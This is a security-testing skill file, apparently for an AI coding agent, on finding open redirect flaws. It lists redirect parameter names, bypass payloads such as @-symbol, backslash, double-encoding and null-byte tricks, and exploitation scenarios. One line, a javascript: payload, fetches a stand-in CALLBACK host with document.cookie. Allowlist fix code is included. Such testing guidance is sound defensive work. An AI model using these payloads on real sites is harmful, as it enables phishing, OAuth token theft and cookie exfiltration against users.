---
name: open-redirect-testing
description: >
  Use when testing redirect or return-URL parameters for open redirect vulnerabilities.
  Trigger on: ?redirect=, ?url=, ?next=, ?return_to=, ?continue=, ?dest=, ?destination=,
  ?return=, ?go= parameters; post-login/logout redirect flows; OAuth callback ?state=;
  any endpoint that reads a URL from input and issues a 301/302/307. Detects filter
  bypass via @-symbol, subdomain abuse, backslash normalization, double URL encoding,
  unicode homographs, null bytes, protocol-relative URLs, data:/javascript: schemes,
  fragment confusion, and DNS rebinding tricks.
license: Apache-2.0
compatibility: Designed for Claude Code. Tools: Burp Suite, ffuf.
metadata:
  category: web
  version: "0.1"
  source: https://github.com/BehiSecc/VibeSec-Skill
  source_types: blog_post
---

# Open Redirect

## What Is Broken and Why

Applications that accept a URL or path from user input and redirect to it without validating
the destination allow attackers to craft links that appear to originate from a trusted domain
but send victims to attacker-controlled pages. Commonly used for phishing, OAuth token
theft, and as a stepping stone to reflected XSS or SSRF.

## Key Signals

- Parameters named `redirect`, `url`, `next`, `return_to`, `continue`, `dest`, `destination`,
  `return`, `go`, `target`, `rurl`, `returl` in GET/POST requests
- HTTP 301/302/307/308 responses with attacker-influenced `Location` header
- Post-login or post-logout redirects that echo back a `?next=` value
- OAuth `state` parameter or `redirect_uri` validation weaknesses
- JavaScript-based redirects: `location.href = param`, `window.location = param`

## Methodology

1. Identify all redirect parameters across login, logout, OAuth flows, and link shorteners.
2. Submit `https://evil.example` as the parameter value; observe if `Location:` reflects it.
3. If a domain check exists, attempt each bypass technique below.
4. Test JavaScript redirects separately — inject `javascript:alert(1)` for XSS path.
5. Check for open redirects on subdomains that can be used to bypass SameSite cookie
   restrictions on the main domain.

## Payloads & Tools

```
# Baseline
?next=https://CALLBACK

# Protocol-relative
?next=//CALLBACK

# javascript: scheme (XSS via redirect)
?next=javascript:alert(document.domain)

# Encoded slashes
?next=%2f%2fCALLBACK
?next=%252f%252fCALLBACK

# @-symbol trick
?next=https://TARGET@CALLBACK

# Backslash normalization
?next=https://TARGET\@CALLBACK
?next=https://TARGET\CALLBACK

# Subdomain confusion
?next=https://TARGET.CALLBACK

# Fragment abuse
?next=https://TARGET#@CALLBACK

# Null byte
?next=https://TARGET%00.CALLBACK

# Tab/whitespace
?next=https://TARGET%09.CALLBACK

# Unicode homograph (Cyrillic/IDN)
?next=https://CALLBACK  (using look-alike chars)

# Data URL
?next=data:text/html,<script>location='https://CALLBACK'</script>
```

## Bypass Techniques

| Technique | Payload | Why It Works |
|-----------|---------|--------------|
| @-symbol | `https://legit.com@evil.com` | Browser navigates to evil.com |
| Protocol-relative | `//evil.com` | Inherits current protocol |
| Backslash | `https://legit.com\@evil.com` | Parsers normalize `\` to `/` |
| Double encode | `%252f%252fevil.com` | Double decode reveals `//evil.com` |
| Null byte | `https://legit.com%00.evil.com` | Parser truncation |
| Fragment | `https://legit.com#@evil.com` | Fragment stripped from domain check |
| Subdomain | `https://legit.com.evil.com` | Starts with trusted domain |
| IDN homograph | Cyrillic `і` vs Latin `i` | Visually identical but different |

## Exploitation Scenarios

**Phishing via trusted domain link:**
Setup → Attacker finds `?next=` parameter on high-trust login page.
Trigger → Victim clicks `https://TARGET/login?next=//CALLBACK`; enters credentials.
Impact → Post-login redirect sends victim to attacker page; credentials/tokens harvested.

**OAuth token theft:**
Setup → OAuth `redirect_uri` accepts any URL matching domain prefix check.
Trigger → Attacker registers `https://TARGET.CALLBACK/` or uses `?redirect_uri=https://TARGET@CALLBACK`.
Impact → Authorization code or token sent to attacker's server.

**XSS via javascript: scheme:**
Setup → Redirect parameter is passed to `window.location` without scheme validation.
Trigger → `?next=javascript:fetch('https://CALLBACK/?c='+document.cookie)`.
Impact → Cookie exfiltration without needing a reflected XSS sink.

## False Positives

- Redirects that only accept relative paths (`/dashboard`) — safe if truly relative and
  validated server-side.
- Redirects to same-domain subdomains with deliberate trust (check whether those subdomains
  can be taken over first).

## Fix Patterns

```python
# Allowlist approach — only allow known safe paths
ALLOWED = {'/dashboard', '/home', '/profile'}
target = request.args.get('next', '/home')
if target not in ALLOWED:
    target = '/home'
redirect(target)

# Relative-only approach
import re
if not re.match(r'^/[^/\\]', target):
    target = '/home'
```

## Related Skills

Open redirects are frequently chained with [[csrf]] (bypassing `Referer` checks via
trusted-domain link), [[xss-reflected]] (javascript: scheme), and [[ssrf]] (server-side
fetch of attacker-provided URL). [[web-fingerprinting]] often reveals the redirect
parameter names through login flow enumeration.
